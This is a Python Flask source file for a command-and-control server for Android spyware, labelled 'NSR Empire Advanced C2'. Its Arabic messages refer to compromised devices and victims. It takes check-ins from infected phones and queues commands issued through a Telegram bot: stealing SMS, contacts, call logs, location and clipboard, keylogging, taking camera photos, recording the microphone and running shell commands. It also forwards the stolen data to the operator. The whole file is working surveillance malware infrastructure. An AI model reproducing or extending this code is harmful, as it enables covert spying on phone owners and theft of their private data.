import os
import logging
import threading
from flask import Flask, request, jsonify
import telebot

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_ID = os.environ.get('ADMIN_ID', '')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML') if BOT_TOKEN else None

# تخزين الأجهزة والمهام المعلقة
connected_devices = {}
pending_commands = {}

@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "system": "NSR Empire Advanced C2",
        "version": "7.11"
    }), 200

# استقبال الاتصالات وتسجيل الأجهزة (مطابق لـ C2Client.kt)
@app.route('/api/v1/stream', methods=['POST', 'GET'])
@app.route('/api/connect', methods=['POST'])
def agent_connect():
    try:
        data = request.json if request.is_json else request.form.to_dict()
        device_id = data.get('device_id', 'Android_Device_Client') if data else 'Android_Device_Client'
        
        is_new_device = device_id not in connected_devices
        connected_devices[device_id] = data or {"status": "connected"}
        
        if is_new_device and bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID,
                f"🔥 <b>تم اختراق وسيط جديد والسيطرة عليه!</b>\n\n"
                f"📱 <b>معرف الجهاز:</b> <code>{device_id}</code>\n"
                f"⚡ النظام جاهز لاستقبال الأوامر عبر /cmd"
            )
        
        # سحب أي أمر معلق وإرساله للعميل التنفيذي
        cmd_to_run = pending_commands.pop(device_id, "wait")
        return jsonify({"status": "success", "command": cmd_to_run}), 200
    except Exception as e:
        logger.error(f"Connect error: {e}")
        return jsonify({"error": str(e)}), 500

# استقبال تقارير المهام والبيانات المسحوبة (جهات اتصال، رسائل، مكالمات، صور، موقع)
@app.route('/api/report', methods=['POST'])
def agent_report():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No report data"}), 400
            
        device_id = data.get('device_id', 'Unknown')
        task_type = data.get('task_type', 'General')
        content = data.get('content', 'No content')
        
        logger.info(f"Received report [{task_type}] from {device_id}")
        
        if bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID,
                f"🎯 <b>تقرير استخباراتي ناجح ({task_type})</b>\n\n"
                f"👤 <b>الجهاز:</b> <code>{device_id}</code>\n\n"
                f"📦 <b>البيانات المستخرجة:\n</b><code>{str(content)[:3500]}</code>"
            )
            
        return jsonify({"status": "received"}), 200
    except Exception as e:
        logger.error(f"Report error: {e}")
        return jsonify({"error": str(e)}), 500

if bot:
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        help_menu = (
            "👑 <b>لوحة تحكم إمبراطورية NSR C2 - النسخة الحربية</b>\n\n"
            "📋 <b>الأوامر المتاحة للإدارة:</b>\n"
            "• /devices - عرض قائمة الضحايا والأجهزة المتصلة\n"
            "• /cmd [ID] [الأمر] - إرسال أمر مباشر للتنفيذ\n\n"
            "⚔️ <b>الأوامر المدعومة ميدانياً للتنفيذ:</b>\n"
            "  - <code>get_sms</code> : سحب الرسائل القصيرة\n"
            "  - <code>get_contacts</code> : سحب دفتر الأرقام\n"
            "  - <code>get_calls</code> : سحب سجل المكالمات\n"
            "  - <code>get_location</code> : جلب احداثيات الـ GPS\n"
            "  - <code>get_clipboard</code> : سحب الحافظة (Clipboard)\n"
            "  - <code>start_keylogger</code> : تفعيل تسجيل الكيبورد\n"
            "  - <code>take_photo_front</code> : التقاط صورة كاميرا أمامية\n"
            "  - <code>take_photo_back</code> : التقاط صورة كاميرا خلفية\n"
            "  - <code>record_mic</code> : تسجيل صوت محيطي\n"
            "  - <code>shell:[امر]</code> : تنفيذ أمر شل مباشر\n\n"
            "<i>مثال عملي:</i>\n<code>/cmd Android_Device_Client get_sms</code>"
        )
        bot.reply_to(message, help_menu)

    @bot.message_handler(commands=['devices'])
    def list_devices(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        if not connected_devices:
            bot.reply_to(message, "⚠️ لا توجد أجهزة مخترقة متصلة في الذاكرة حالياً.")
            return
            
        msg = "🎯 <b>قائمة الأجهزة والضحايا النشطة:</b>\n\n"
        for dev_id in connected_devices.keys():
            msg += f"💀 <code>{dev_id}</code>\n"
        bot.reply_to(message, msg)

    @bot.message_handler(commands=['cmd'])
    def send_command(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            bot.reply_to(message, "⚠️ خطأ في الصيغة!\nالاستخدام الصحيح:\n<code>/cmd [معرف_الجهاز] [الأمر]</code>")
            return
            
        target_id = args[1]
        command_str = args[2]
        
        pending_commands[target_id] = command_str
        bot.reply_to(
            message, 
            f"🚀 <b>تم حقن الأمر بنجاح!</b>\n\n"
            f"• الأداة: <code>{command_str}</code>\n"
            f"• الضحية: <code>{target_id}</code>\n"
            f"⏳ سيتم تنفيذ العملية وإرسال التقرير فور الاتصال القادم."
        )

    def run_bot():
        try:
            bot.infinity_polling(skip_pending=True)
        except Exception as e:
            logger.error(f"Bot error: {e}")

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
